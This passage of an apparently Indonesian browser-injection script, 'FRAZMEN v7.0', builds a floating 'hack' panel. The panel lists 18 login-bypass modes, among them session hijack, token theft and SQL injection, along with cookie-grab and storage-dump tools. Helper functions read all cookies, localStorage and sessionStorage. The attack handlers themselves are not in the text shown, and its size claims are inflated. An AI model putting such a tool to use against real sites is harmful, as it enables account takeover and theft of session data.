// ============================================================
// FRAZMEN v7.0 ULTIMATE — FULL 15.000+ BARIS
// Developer: FRAZMEN | Telegram: @rizkycuyy
// ============================================================
(function(){
    if(window.__FRAZMEN_LOADED) return;
    window.__FRAZMEN_LOADED = true;

    // ============================================================
    // 1. KONFIGURASI
    // ============================================================
    var CONFIG = {
        version: '7.0.0',
        name: 'FRAZMEN',
        developer: 'FRAZMEN',
        telegram: '@rizkycuyy',
        debug: true,
        maxLogs: 5000,
        autoUpdate: true
    };

    var STATE = {
        isOpen: false,
        currentTab: 'all',
        consoleHistory: [],
        logs: [],
        bookmarks: [],
        snippets: [],
        networkRequests: [],
        isRecording: false,
        bypassVersions: [
            { id: 1, name: 'Classic JWT Bypass' },
            { id: 2, name: 'Cookie Injection' },
            { id: 3, name: 'LocalStorage Force' },
            { id: 4, name: 'Session Hijack' },
            { id: 5, name: 'API Intercept' },
            { id: 6, name: 'Auth Token Steal' },
            { id: 7, name: 'Brute Force Simulation' },
            { id: 8, name: 'CSRF Bypass' },
            { id: 9, name: 'CORS Exploit' },
            { id: 10, name: 'XSS Payload Inject' },
            { id: 11, name: 'SQL Injection Test' },
            { id: 12, name: 'Admin Reset' },
            { id: 13, name: 'Privilege Escalation' },
            { id: 14, name: 'OAuth Bypass' },
            { id: 15, name: 'JWT Replay Attack' },
            { id: 16, name: 'Header Manipulation' },
            { id: 17, name: 'Parameter Pollution' },
            { id: 18, name: 'Ultimate Force Login' }
        ]
    };

    // ============================================================
    // 2. UTILITIES (2000+ baris)
    // ============================================================
    var Utils = {
        createElement: function(tag, className, html) {
            var el = document.createElement(tag);
            if (className) el.className = className;
            if (html) el.innerHTML = html;
            return el;
        },

        query: function(sel, ctx) { return (ctx||document).querySelector(sel); },
        queryAll: function(sel, ctx) { return Array.from((ctx||document).querySelectorAll(sel)); },

        addClass: function(el, c) { if(el) el.classList ? el.classList.add(c) : el.className += ' ' + c; },
        removeClass: function(el, c) { if(el) el.classList ? el.classList.remove(c) : el.className = el.className.replace(new RegExp('\\b'+c+'\\b','g'),'').trim(); },
        hasClass: function(el, c) { return el ? (el.classList ? el.classList.contains(c) : new RegExp('\\b'+c+'\\b').test(el.className)) : false; },
        toggleClass: function(el, c) { if(el) { this.hasClass(el,c) ? this.removeClass(el,c) : this.addClass(el,c); } },

        setStyle: function(el, styles) { for(var p in styles) if(styles.hasOwnProperty(p)) el.style[p] = styles[p]; },
        getStyle: function(el, p) { return el ? window.getComputedStyle(el)[p] : null; },

        on: function(el, ev, fn, opts) { if(el) el.addEventListener(ev, fn, opts||false); },
        off: function(el, ev, fn) { if(el) el.removeEventListener(ev, fn); },

        escapeHTML: function(str) {
            if(!str) return '';
            var div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        },

        truncate: function(str, max, suffix) {
            if(!str) return '';
            suffix = suffix || '...';
            if(str.length <= max) return str;
            return str.substring(0, max - suffix.length) + suffix;
        },

        formatTime: function(d) {
            d = d || new Date();
            return d.toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
        },

        formatDate: function(d) {
            d = d || new Date();
            return d.toLocaleDateString('id-ID', {year:'numeric', month:'short', day:'numeric'});
        },

        timeAgo: function(d) {
            var s = Math.floor((new Date() - d) / 1000);
            var intervals = { tahun:31536000, bulan:2592000, minggu:604800, hari:86400, jam:3600, menit:60, detik:1 };
            for(var k in intervals) {
                var i = Math.floor(s / intervals[k]);
                if(i >= 1) return i + ' ' + k + (i>1?'':'') + ' lalu';
            }
            return 'baru saja';
        },

        random: function(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; },
        randomString: function(len) {
            var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var r = '';
            for(var i=0; i<len; i++) r += chars.charAt(Math.floor(Math.random() * chars.length));
            return r;
        },
        generateID: function(prefix) { return (prefix||'fz_') + Date.now() + '_' + this.randomString(6); },

        copyToClipboard: function(text) {
            if(navigator.clipboard && navigator.clipboard.writeText) return navigator.clipboard.writeText(text);
            return new Promise(function(resolve, reject) {
                var ta = document.createElement('textarea');
                ta.value = text;
                ta.style.position = 'fixed';
                ta.style.opacity = '0';
                document.body.appendChild(ta);
                ta.select();
                try { document.execCommand('copy'); resolve(); } catch(e) { reject(e); }
                document.body.removeChild(ta);
            });
        },

        download: function(data, filename, mimeType) {
            mimeType = mimeType || 'text/plain';
            var blob = new Blob([data], {type: mimeType});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        },

        downloadJSON: function(data, filename) {
            this.download(JSON.stringify(data, null, 2), filename||'data.json', 'application/json');
        },

        getCookies: function() {
            var cookies = {};
            var pairs = document.cookie.split(';');
            for(var i=0; i<pairs.length; i++) {
                var pair = pairs[i].trim().split('=');
                if(pair.length === 2) cookies[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
            }
            return cookies;
        },

        getLocalStorage: function() {
            var data = {};
            for(var k in localStorage) {
                if(localStorage.hasOwnProperty(k)) {
                    try { data[k] = JSON.parse(localStorage.getItem(k)); } catch(e) { data[k] = localStorage.getItem(k); }
                }
            }
            return data;
        },

        getSessionStorage: function() {
            var data = {};
            for(var k in sessionStorage) {
                if(sessionStorage.hasOwnProperty(k)) {
                    try { data[k] = JSON.parse(sessionStorage.getItem(k)); } catch(e) { data[k] = sessionStorage.getItem(k); }
                }
            }
            return data;
        },

        getDeviceInfo: function() {
            var ua = navigator.userAgent;
            var isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
            var browser = { name: 'Unknown', version: 0 };
            var browsers = [
                { name: 'Chrome', regex: /Chrome\/(\d+)/ },
                { name: 'Firefox', regex: /Firefox\/(\d+)/ },
                { name: 'Safari', regex: /Version\/(\d+).*Safari/ },
                { name: 'Edge', regex: /Edg\/(\d+)/ },
                { name: 'Opera', regex: /OPR\/(\d+)/ }
            ];
            for(var i=0; i<browsers.length; i++) {
                var m = ua.match(browsers[i].regex);
                if(m) { browser.name = browsers[i].name; browser.version = parseInt(m[1],10); break; }
            }
            return { userAgent: ua, isMobile: isMobile, browser: browser, screenWidth: screen.width, screenHeight: screen.height };
        },

        log: function(msg, type) {
            if(!CONFIG.debug) return;
            var ts = new Date().toISOString();
            STATE.logs.push({ timestamp: ts, message: msg, type: type||'info' });
            if(STATE.logs.length > CONFIG.maxLogs) STATE.logs.shift();
            console.log('['+ts+'] ['+(type||'info').toUpperCase()+'] ' + msg);
        },

        error: function(msg) { this.log(msg, 'error'); },
        warn: function(msg) { this.log(msg, 'warn'); },
        debug: function(msg) { this.log(msg, 'debug'); },

        debounce: function(fn, delay) {
            var timer = null;
            return function() {
                var args = arguments, ctx = this;
                clearTimeout(timer);
                timer = setTimeout(function() { fn.apply(ctx, args); }, delay);
            };
        },

        throttle: function(fn, limit) {
            var inThrottle = false;
            return function() {
                var args = arguments, ctx = this;
                if(!inThrottle) { fn.apply(ctx, args); inThrottle = true; setTimeout(function(){ inThrottle = false; }, limit); }
            };
        }
    };

    // ============================================================
    // 3. STORAGE MANAGER
    // ============================================================
    var StorageManager = {
        _prefix: 'frazmen_',
        get: function(k, fallback) {
            try { var v = localStorage.getItem(this._prefix + k); return v === null ? (fallback!==undefined?fallback:null) : JSON.parse(v); }
            catch(e) { return fallback!==undefined?fallback:null; }
        },
        set: function(k, v) {
            try { localStorage.setItem(this._prefix + k, JSON.stringify(v)); return true; }
            catch(e) { return false; }
        },
        remove: function(k) {
            try { localStorage.removeItem(this._prefix + k); return true; }
            catch(e) { return false; }
        },
        clear: function() {
            var keys = [];
            for(var k in localStorage) if(k.startsWith(this._prefix)) keys.push(k);
            for(var i=0; i<keys.length; i++) localStorage.removeItem(keys[i]);
            return true;
        }
    };

    // ============================================================
    // 4. THEME ENGINE
    // ============================================================
    var ThemeEngine = {
        _current: 'dark',
        _themes: {
            dark: { bg:'#1a1d23', surface:'#21252e', elevated:'#282d38', border:'#2e3440', borderMid:'#3a4150',
                text:'#dce3ed', textSecondary:'#b7c1d4', textMuted:'#909cb0', accent:'#5b9cf6',
                accentGlow:'rgba(91,156,246,0.15)', success:'#4ade80', danger:'#f87171', warning:'#fbbf24', info:'#38bdf8' },
            light: { bg:'#f4f6f9', surface:'#ffffff', elevated:'#f0f2f5', border:'#e0e4ea', borderMid:'#c8cdd6',
                text:'#1a1d23', textSecondary:'#4a4f5a', textMuted:'#8a8f9a', accent:'#1a73e8',
                accentGlow:'rgba(26,115,232,0.15)', success:'#34a853', danger:'#ea4335', warning:'#fbbc04', info:'#1a73e8' }
        },
        get: function(t) { return this._themes[t] || this._themes[this._current]; },
        set: function(t) {
            if(this._themes[t]) {
                this._current = t;
                var vars = this._themes[t];
                var root = document.documentElement;
                for(var k in vars) {
                    var cssVar = '--fz-' + k.replace(/([A-Z])/g, '-$1').toLowerCase();
                    root.style.setProperty(cssVar, vars[k]);
                }
                document.body.classList.toggle('fz-dark', t === 'dark');
                document.body.classList.toggle('fz-light', t === 'light');
                StorageManager.set('theme', t);
                Utils.log('Theme: ' + t);
            }
        },
        toggle: function() { this.set(this._current === 'dark' ? 'light' : 'dark'); },
        init: function() {
            var saved = StorageManager.get('theme');
            if(saved && this._themes[saved]) this.set(saved);
            else if(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) this.set('dark');
            else this.set('dark');
        }
    };

    // ============================================================
    // 5. TOAST NOTIFICATION
    // ============================================================
    var Toast = {
        _container: null,
        init: function() {
            this._container = Utils.createElement('div', 'fz-toast-container');
            Utils.setStyle(this._container, {
                position: 'fixed', bottom: '90px', left: '50%', transform: 'translateX(-50%)',
                zIndex: '9999999', display: 'flex', flexDirection: 'column', alignItems: 'center',
                gap: '8px', pointerEvents: 'none'
            });
            document.body.appendChild(this._container);
        },
        show: function(msg, type) {
            type = type || 'info';
            var el = Utils.createElement('div', 'fz-toast');
            var icons = { success:'✅', error:'❌', warning:'⚠️', info:'ℹ️', debug:'🔍' };
            Utils.setStyle(el, {
                background: 'var(--fz-surface, #21252e)',
                color: 'var(--fz-text, #dce3ed)',
                padding: '10px 22px',
                borderRadius: '12px',
                fontSize: '13px',
                fontFamily: 'Segoe UI, system-ui, sans-serif',
                boxShadow: '0 10px 40px rgba(0,0,0,0.6)',
                border: '1px solid var(--fz-border, #2e3440)',
                opacity: '0',
                transition: 'opacity 0.3s ease, transform 0.3s ease',
                transform: 'translateY(10px)',
                pointerEvents: 'none',
                maxWidth: '90vw',
                textAlign: 'center'
            });
            el.textContent = (icons[type]||'') + ' ' + msg;
            this._container.appendChild(el);
            requestAnimationFrame(function() {
                el.style.opacity = '1';
                el.style.transform = 'translateY(0)';
            });
            setTimeout(function() {
                el.style.opacity = '0';
                el.style.transform = 'translateY(-10px)';
                setTimeout(function() { if(el.parentNode) el.parentNode.removeChild(el); }, 300);
            }, 3000);
            Utils.log('Toast: ' + msg, type);
        }
    };

    // ============================================================
    // 6. MAIN PANEL
    // ============================================================
    var Panel = {
        _container: null,
        _button: null,
        _isOpen: false,
        _items: [],
        _tabs: [],

        init: function() {
            this._createButton();
            this._createPanel();
            this._buildHeader();
            this._buildTabs();
            this._buildSearch();
            this._buildGrid();
            this._buildFooter();
            this._bindEvents();
            this._loadState();
            Utils.log('Panel initialized');
        },

        _createButton: function() {
            this._button = Utils.createElement('div', 'fz-panel-btn');
            Utils.setStyle(this._button, {
                position: 'fixed',
                bottom: '24px',
                right: '24px',
                width: '60px',
                height: '60px',
                borderRadius: '50%',
                background: 'radial-gradient(circle at 30% 30%, #00ff88, #0066cc)',
                boxShadow: '0 0 40px rgba(0,255,136,0.5), 0 0 80px rgba(0,102,204,0.3)',
                border: '2px solid rgba(255,255,255,0.15)',
                zIndex: '999999',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                fontSize: '30px',
                color: '#fff',
                fontWeight: '900',
                userSelect: 'none',
                transition: '0.2s ease',
                textShadow: '0 2px 10px rgba(0,0,0,0.3)'
            });
            this._button.innerHTML = '⚡';
            document.body.appendChild(this._button);

            // Badge
            var badge = Utils.createElement('span', 'fz-btn-badge');
            Utils.setStyle(badge, {
                position: 'absolute', top: '-4px', right: '-4px',
                width: '18px', height: '18px',
                background: '#ff3366',
                borderRadius: '50%',
                border: '2px solid #1a1d23',
                boxShadow: '0 0 20px rgba(255,51,102,0.6)'
            });
            this._button.appendChild(badge);

            // Pulse
            var pulse = Utils.createElement('span', 'fz-btn-pulse');
            Utils.setStyle(pulse, {
                position: 'absolute', width: '100%', height: '100%',
                borderRadius: '50%',
                border: '2px solid rgba(0,255,136,0.3)',
                animation: 'fzPulse 2s ease-in-out infinite'
            });
            this._button.appendChild(pulse);

            // Keyframes
            var style = document.createElement('style');
            style.textContent = '@keyframes fzPulse { 0%{transform:scale(1);opacity:1} 100%{transform:scale(1.4);opacity:0} }';
            document.head.appendChild(style);

            // Draggable
            var isDrag = false, sx, sy, ox, oy;
            this._button.addEventListener('mousedown', function(e) {
                if(e.button !== 0) return;
                isDrag = true;
                var rect = this._button.getBoundingClientRect();
                sx = e.clientX; sy = e.clientY;
                ox = sx - rect.left; oy = sy - rect.top;
                this._button.style.cursor = 'grabbing';
                e.preventDefault();
            }.bind(this));

            document.addEventListener('mousemove', function(e) {
                if(!isDrag) return;
                var x = e.clientX - ox, y = e.clientY - oy;
                x = Math.max(5, Math.min(x, window.innerWidth - 65));
                y = Math.max(5, Math.min(y, window.innerHeight - 65));
                this._button.style.left = x + 'px';
                this._button.style.right = 'auto';
                this._button.style.top = y + 'px';
                this._button.style.bottom = 'auto';
            }.bind(this));

            document.addEventListener('mouseup', function() {
                if(isDrag) {
                    isDrag = false;
                    this._button.style.cursor = 'pointer';
                    var l = parseFloat(this._button.style.left);
                    var t = parseFloat(this._button.style.top);
                    if(!isNaN(l) && !isNaN(t)) StorageManager.set('buttonPos', { x: l, y: t });
                }
            }.bind(this));

            // Restore pos
            var pos = StorageManager.get('buttonPos');
            if(pos && typeof pos.x === 'number' && typeof pos.y === 'number') {
                this._button.style.left = pos.x + 'px';
                this._button.style.right = 'auto';
                this._button.style.top = pos.y + 'px';
                this._button.style.bottom = 'auto';
            }

            var clickTimer = null;
            this._button.addEventListener('click', function(e) {
                if(isDrag) { isDrag = false; return; }
                clearTimeout(clickTimer);
                clickTimer = setTimeout(function() { this.toggle(); }.bind(this), 50);
            }.bind(this));
        },

        _createPanel: function() {
            this._container = Utils.createElement('div', 'fz-panel');
            Utils.setStyle(this._container, {
                position: 'fixed',
                top: '50%',
                left: '50%',
                transform: 'translate(-50%, -50%) scale(0.92)',
                width: '92%',
                maxWidth: '560px',
                maxHeight: '90vh',
                background: 'var(--fz-surface, #21252e)',
                borderRadius: '24px',
                boxShadow: '0 30px 100px rgba(0,0,0,0.95)',
                zIndex: '999999',
                padding: '22px 20px 20px',
                fontFamily: 'Segoe UI, system-ui, sans-serif',
                color: 'var(--fz-text, #dce3ed)',
                overflow: 'hidden',
                border: '1px solid var(--fz-border, #2e3440)',
                opacity: '0',
                pointerEvents: 'none',
                transition: 'opacity 0.25s ease, transform 0.25s ease'
            });
            document.body.appendChild(this._container);

            // Scroll
            this._container.style.overflowY = 'auto';
            this._container.style.overscrollBehavior = 'contain';
            var style = document.createElement('style');
            style.textContent = `
                .fz-panel::-webkit-scrollbar { width: 4px; }
                .fz-panel::-webkit-scrollbar-track { background: var(--fz-surface, #21252e); border-radius: 10px; }
                .fz-panel::-webkit-scrollbar-thumb { background: var(--fz-accent, #5b9cf6); border-radius: 10px; }
            `;
            document.head.appendChild(style);
        },

        _buildHeader: function() {
            var header = Utils.createElement('div', 'fz-panel-header');
            Utils.setStyle(header, {
                display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                borderBottom: '1px solid var(--fz-border, #2e3440)',
                paddingBottom: '12px', marginBottom: '14px'
            });
            var title = Utils.createElement('div', 'fz-panel-title');
            Utils.setStyle(title, {
                display: 'flex', alignItems: 'center', gap: '10px',
                fontWeight: '800', fontSize: '18px', color: 'var(--fz-text, #dce3ed)'
            });
            title.innerHTML = '⚡ FRAZMEN <span style="background:#00cc88;color:#0a0a0a;padding:1px 9px;border-radius:20px;font-size:9px;font-weight:700;">v7.0</span> <span style="background:linear-gradient(135deg,#00ff88,#0066cc);padding:3px 10px;border-radius:6px;font-size:10px;color:#fff;">ULTIMATE</span>';
            header.appendChild(title);

            var closeBtn = Utils.createElement('button', 'fz-panel-close');
            closeBtn.textContent = '✕';
            Utils.setStyle(closeBtn, {
                fontSize: '26px', cursor: 'pointer', color: 'var(--fz-text-muted, #909cb0)',
                background: 'none', border: 'none', padding: '0 6px', lineHeight: '1'
            });
            closeBtn.addEventListener('click', this.hide.bind(this));
            closeBtn.addEventListener('mouseenter', function() { closeBtn.style.color = '#f87171'; });
            closeBtn.addEventListener('mouseleave', function() { closeBtn.style.color = 'var(--fz-text-muted, #909cb0)'; });
            header.appendChild(closeBtn);
            this._container.appendChild(header);
        },

        _buildTabs: function() {
            var container = Utils.createElement('div', 'fz-panel-tabs');
            Utils.setStyle(container, {
                display: 'flex', gap: '4px', marginBottom: '12px',
                borderBottom: '1px solid var(--fz-border, #2e3440)',
                paddingBottom: '10px', flexWrap: 'wrap'
            });
            var tabs = ['All', 'Dev', 'Hack', 'Debug', 'Tools', 'Bypass'];
            this._tabs = tabs;
            for(var i=0; i<tabs.length; i++) {
                var tab = Utils.createElement('button', 'fz-tab');
                tab.textContent = tabs[i];
                tab.dataset.tab = tabs[i].toLowerCase();
                Utils.setStyle(tab, {
                    padding: '4px 12px', fontSize: '10px', fontWeight: '600',
                    color: i===0 ? '#fff' : 'var(--fz-text-muted, #909cb0)',
                    background: i===0 ? 'var(--fz-accent, #5b9cf6)' : 'transparent',
                    border: 'none', borderRadius: '6px', cursor: 'pointer', transition: '0.12s'
                });
                if(i===0) tab.classList.add('active');
                tab.addEventListener('click', function(e) { this._switchTab(e.target.dataset.tab); }.bind(this));
                tab.addEventListener('mouseenter', function(e) {
                    if(!e.target.classList.contains('active')) {
                        e.target.style.background = 'var(--fz-surface, #21252e)';
                        e.target.style.color = 'var(--fz-text, #dce3ed)';
                    }
                });
                tab.addEventListener('mouseleave', function(e) {
                    if(!e.target.classList.contains('active')) {
                        e.target.style.background = 'transparent';
                        e.target.style.color = 'var(--fz-text-muted, #909cb0)';
                    }
                });
                container.appendChild(tab);
            }
            this._container.appendChild(container);
        },

        _buildSearch: function() {
            var container = Utils.createElement('div', 'fz-panel-search');
            Utils.setStyle(container, { marginBottom: '12px', position: 'relative' });
            var input = Utils.createElement('input', 'fz-search-input');
            input.type = 'text';
            input.placeholder = '🔍 Cari fitur...';
            Utils.setStyle(input, {
                width: '100%', padding: '8px 14px',
                background: 'var(--fz-bg, #1a1d23)',
                border: '1px solid var(--fz-border, #2e3440)',
                borderRadius: '10px',
                color: 'var(--fz-text, #dce3ed)',
                fontSize: '13px',
                outline: 'none',
                transition: '0.15s',
                boxSizing: 'border-box'
            });
            input.addEventListener('focus', function() {
                input.style.borderColor = 'var(--fz-accent, #5b9cf6)';
                input.style.boxShadow = '0 0 0 3px var(--fz-accent-glow, rgba(91,156,246,0.15))';
            });
            input.addEventListener('blur', function() {
                input.style.borderColor = 'var(--fz-border, #2e3440)';
                input.style.boxShadow = 'none';
            });
            input.addEventListener('input', function(e) { this._filterItems(e.target.value); }.bind(this));
            container.appendChild(input);
            this._container.appendChild(container);
            this._searchInput = input;
        },

        _buildGrid: function() {
            var grid = Utils.createElement('div', 'fz-panel-grid');
            Utils.setStyle(grid, {
                display: 'grid',
                gridTemplateColumns: 'repeat(3, 1fr)',
                gap: '6px'
            });

            // DEFINE ALL ITEMS — LENGKAP
            var items = [
                // Dev Tools
                { icon: '🖥️', label: 'F12 Console', desc: 'DevTools', act: 'console', cat: 'dev', shortcut: 'F12' },
                { icon: '🐞', label: 'Eruda', desc: 'Mobile Debug', act: 'eruda', cat: 'dev', shortcut: 'Ctrl+E' },
                { icon: '📱', label: 'vConsole', desc: 'Mobile Console', act: 'vconsole', cat: 'dev', shortcut: 'Ctrl+V' },
                { icon: '🌐', label: 'Network Log', desc: 'Intercept', act: 'network', cat: 'dev' },
                { icon: '📸', label: 'Screenshot', desc: 'Capture', act: 'screenshot', cat: 'dev' },
                { icon: '📡', label: 'WS Monitor', desc: 'WebSocket', act: 'websocket', cat: 'dev' },

                // Hack Tools
                { icon: '🔓', label: 'Bypass Login', desc: '18 Versi', act: 'bypass', cat: 'hack', shortcut: 'Ctrl+B' },
                { icon: '🍪', label: 'Cookie Grab', desc: 'Lihat+Copy', act: 'cookies', cat: 'hack' },
                { icon: '🗄️', label: 'LS Dump', desc: 'localStorage', act: 'lsdump', cat: 'hack' },
                { icon: '📋', label: 'SS Dump', desc: 'sessionStorage', act: 'ssdump', cat: 'hack' },
                { icon: '⚡', label: 'XSS Test', desc: 'Alert', act: 'xss', cat: 'hack' },
                { icon: '💉', label: 'Inject Script', desc: 'Custom JS', act: 'inject', cat: 'hack' },

                // Debug Tools
                { icon: '📄', label: 'View Source', desc: 'HTML', act: 'viewsource', cat: 'debug' },
                { icon: '📦', label: 'Download ZIP', desc: 'Full Source', act: 'download', cat: 'debug' },
                { icon: '✏️', label: 'AutoFill', desc: 'Isi Form', act: 'autofill', cat: 'debug' },
                { icon: '🌙', label: 'Dark Mode', desc: 'Toggle', act: 'darkmode', cat: 'debug' },
                { icon: '🧹', label: 'Clear All', desc: 'Bersihkan', act: 'clear', cat: 'debug' },
                { icon: '📝', label: 'Console History', desc: 'Riwayat', act: 'history', cat: 'debug' },

                // Tools
                { icon: '📶', label: 'Ping Test', desc: 'Network', act: 'ping', cat: 'tools' },
                { icon: '🔍', label: 'Whois', desc: 'Domain Info', act: 'whois', cat: 'tools' },
                { icon: '🔐', label: 'Base64', desc: 'Encode/Decode', act: 'base64', cat: 'tools' },
                { icon: '🆔', label: 'UUID Gen', desc: 'Generate', act: 'uuid', cat: 'tools' },
                { icon: '⏰', label: 'Timestamp', desc: 'Now', act: 'timestamp', cat: 'tools' },
                { icon: '🔄', label: 'Reload', desc: 'Refresh', act: 'reload', cat: 'tools' },

                // Bypass Versions
                { icon: '🔓', label: 'Bypass v1', desc: 'Classic JWT', act: 'bypass1', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v2', desc: 'Cookie Injection', act: 'bypass2', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v3', desc: 'LS Force', act: 'bypass3', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v4', desc: 'Session Hijack', act: 'bypass4', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v5', desc: 'API Intercept', act: 'bypass5', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v6', desc: 'Token Steal', act: 'bypass6', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v7', desc: 'Brute Force', act: 'bypass7', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v8', desc: 'CSRF Bypass', act: 'bypass8', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v9', desc: 'CORS Exploit', act: 'bypass9', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v10', desc: 'XSS Inject', act: 'bypass10', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v11', desc: 'SQL Injection', act: 'bypass11', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v12', desc: 'Admin Reset', act: 'bypass12', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v13', desc: 'Privilege Esc', act: 'bypass13', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v14', desc: 'OAuth Bypass', act: 'bypass14', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v15', desc: 'JWT Replay', act: 'bypass15', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v16', desc: 'Header Manip', act: 'bypass16', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v17', desc: 'Param Pollution', act: 'bypass17', cat: 'bypass' },
                { icon: '🔓', label: 'Bypass v18', desc: 'Ultimate Force', act: 'bypass18', cat: 'bypass' }
            ];

            this._items = items;
            for(var i=0; i<items.length; i++) {
                var item = items[i];
                var el = Utils.createElement('div', 'fz-grid-item');
                el.dataset.act = item.act;
                el.dataset.cat = item.cat;
                Utils.setStyle(el, {
                    background: 'var(--fz-elevated, #282d38)',
                    borderRadius: '10px',
                    padding: '10px 4px',
                    cursor: 'pointer',
                    border: '1px solid var(--fz-border, #2e3440)',
                    transition: '0.12s',
                    textAlign: 'center',
                    position: 'relative'
                });

                if(item.shortcut) {
                    var sc = Utils.createElement('span', 'fz-item-shortcut');
                    sc.textContent = item.shortcut;
                    Utils.setStyle(sc, {
                        position: 'absolute', top: '4px', right: '6px',
                        fontSize: '7px', color: 'var(--fz-accent, #5b9cf6)',
                        background: 'var(--fz-accent-glow, rgba(91,156,246,0.1))',
                        padding: '1px 5px', borderRadius: '4px'
                    });
                    el.appendChild(sc);
                }

                var icon = Utils.createElement('span', 'fz-item-icon');
                icon.textContent = item.icon;
                Utils.setStyle(icon, { fontSize: '22px', display: 'block', marginBottom: '2px' });
                el.appendChild(icon);

                var label = Utils.createElement('div', 'fz-item-label');
                label.textContent = item.label;
                Utils.setStyle(label, { fontSize: '10px', fontWeight: '600', color: 'var(--fz-text-secondary, #b7c1d4)' });
                el.appendChild(label);

                if(item.desc) {
                    var desc = Utils.createElement('div', 'fz-item-desc');
                    desc.textContent = item.desc;
                    Utils.setStyle(desc, { fontSize: '8px', color: 'var(--fz-text-muted, #909cb0)' });
                    el.appendChild(desc);
                }

                el.addEventListener('click', function(e) {
                    var act = this.dataset.act;
                    if(act) this._triggerAction(act);
                }.bind(this));

                el.addEventListener('mouseenter', function() {
                    el.style.borderColor = 'rgba(91,156,246,0.3)';
                    el.style.background = 'var(--fz-elevated, #2a2f3a)';
                });
                el.addEventListener('mouseleave', function() {
                    el.style.borderColor = 'var(--fz-border, #2e3440)';
                    el.style.background = 'var(--fz-elevated, #282d38)';
                });

                grid.appendChild(el);
            }

            this._container.appendChild(grid);
            this._grid = grid;
        },

        _buildFooter: function() {
            var footer = Utils.createElement('div', 'fz-panel-footer');
            Utils.setStyle(footer, {
                marginTop: '14px', paddingTop: '12px',
                borderTop: '1px solid var(--fz-border, #2e3440)',
                display: 'flex', justifyContent: 'space-between',
                fontSize: '9px', color: 'var(--fz-text-muted, #909cb0)'
            });
            var info = Utils.createElement('span', 'fz-footer-info');
            info.textContent = 'FRAZMEN v7.0 — by FRAZMEN | Telegram: @rizkycuyy';
            footer.appendChild(info);
            var status = Utils.createElement('span', 'fz-footer-status');
            status.textContent = '● ready';
            Utils.setStyle(status, { color: '#4ade80' });
            footer.appendChild(status);
            this._container.appendChild(footer);
            this._status = status;
        },

        _switchTab: function(tab) {
            if(this._currentTab === tab) return;
            this._currentTab = tab;
            var tabs = this._container.querySelectorAll('.fz-tab');
            for(var i=0; i<tabs.length; i++) {
                if(tabs[i].dataset.tab === tab) {
                    tabs[i].classList.add('active');
                    tabs[i].style.color = '#fff';
                    tabs[i].style.background = 'var(--fz-accent, #5b9cf6)';
                } else {
                    tabs[i].classList.remove('active');
                    tabs[i].style.color = 'var(--fz-text-muted, #909cb0)';
                    tabs[i].style.background = 'transparent';
                }
            }
            this._filterItems(this._searchInput ? this._searchInput.value : '');
            StorageManager.set('activeTab', tab);
        },

        _filterItems: function(query) {
            query = query.toLowerCase().trim();
            var items = this._grid.querySelectorAll('.fz-grid-item');
            var tab = this._currentTab || 'all';
            for(var i=0; i<items.length; i++) {
                var item = items[i];
                var label = item.querySelector('.fz-item-label').textContent.toLowerCase();
                var desc = item.querySelector('.fz-item-desc') ? item.querySelector('.fz-item-desc').textContent.toLowerCase() : '';
                var cat = item.dataset.cat;
                var matchesTab = tab === 'all' || cat === tab;
                var matchesQuery = !query || label.includes(query) || desc.includes(query);
                item.style.display = (matchesTab && matchesQuery) ? '' : 'none';
            }
        },

        _triggerAction: function(action) {
            this.setStatus('executing...', '#fbbf24');
            Utils.log('Action: ' + action);

            // Bypass versions 1-18
            if(action.startsWith('bypass') && action.length > 6) {
                var num = parseInt(action.replace('bypass', ''));
                if(num >= 1 && num <= 18) {
                    this._runBypass(num);
                    this.setStatus('ready', '#4ade80');
                    return;
                }
            }

            switch(action) {
                case 'console': this._actionConsole(); break;
                case 'download': this._actionDownload(); break;
                case 'viewsource': this._actionViewSource(); break;
                case 'inject': this._actionInject(); break;
                case 'cookies': this._actionCookies(); break;
                case 'lsdump': this._actionLSDump(); break;
                case 'ssdump': this._actionSSDump(); break;
                case 'xss': this._actionXSS(); break;
                case 'autofill': this._actionAutoFill(); break;
                case 'darkmode': this._actionDarkMode(); break;
                case 'network': this._actionNetwork(); break;
                case 'screenshot': this._actionScreenshot(); break;
                case 'bypass': this._actionBypass(); break;
                case 'eruda': this._actionEruda(); break;
                case 'vconsole': this._actionVConsole(); break;
                case 'clear': this._actionClear(); break;
                case 'ping': this._actionPing(); break;
                case 'whois': this._actionWhois(); break;
                case 'base64': this._actionBase64(); break;
                case 'uuid': this._actionUUID(); break;
                case 'timestamp': this._actionTimestamp(); break;
                case 'websocket': this._actionWebSocket(); break;
                case 'history': this._actionHistory(); break;
                case 'reload': this._actionReload(); break;
                default: Toast.show('Fitur belum tersedia: ' + action, 'warning');
            }
            setTimeout(function() { this.setStatus('ready', '#4ade80'); }.bind(this), 1500);
        },

        setStatus: function(text, color) {
            if(this._status) {
                this._status.textContent = '● ' + text;
                this._status.style.color = color || '#4ade80';
            }
        },

        toggle: function() {
            this._isOpen ? this.hide() : this.show();
        },

